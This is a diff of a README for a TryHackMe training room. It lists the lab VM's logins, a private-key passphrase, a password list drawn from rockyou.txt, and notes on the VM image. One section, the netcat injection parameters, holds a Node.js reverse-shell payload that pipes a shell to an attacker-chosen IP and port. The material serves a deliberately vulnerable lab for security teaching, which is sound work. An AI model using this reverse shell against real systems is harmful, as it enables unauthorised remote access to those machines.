@@ -1,17 +1,16 @@
 # thm_atdits
-TryHackMe Room for Aktuelle Themen der IT-Sicherheit
+This repository holds or links to all the files needed to complete or recreate the TryHackMe room [AtDits](https://tryhackme.com/jr/atdits).
 
 ## Login Data for the VM
-```
-paul
-SicheresPasswort
+>User: paul  
+>Password: SicheresPasswort
 
-root
-IchMagZuege!
+>User: root  
+>Password: IchMagZuege!
 
-root cert pw
-felix1
-```
+>[Private Key](VM-Key/id_rsa) Passphrase  
+>felix1
+
 
 ## Injection params for netcat
 ```
@@ -20,3 +19,13 @@ var client = new net.Socket();
 client.connect(<Socket You are listenning on>, "<Your-IP>", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
 sh.stderr.pipe(client);});
 ```
+## Short password list
+
+The short [password list](passwordlist/rockyou.txt) is a list of around 200 passwords from the rockyou.txt list.  
+It holds also the passophrase for the private key.
+
+## VM
+The VM is a Ubuntu Server 20.04 Image.  
+It is in the `.ova` format and can be directly uploaded to TryHackMe.
+
+File: [VM.ova]()
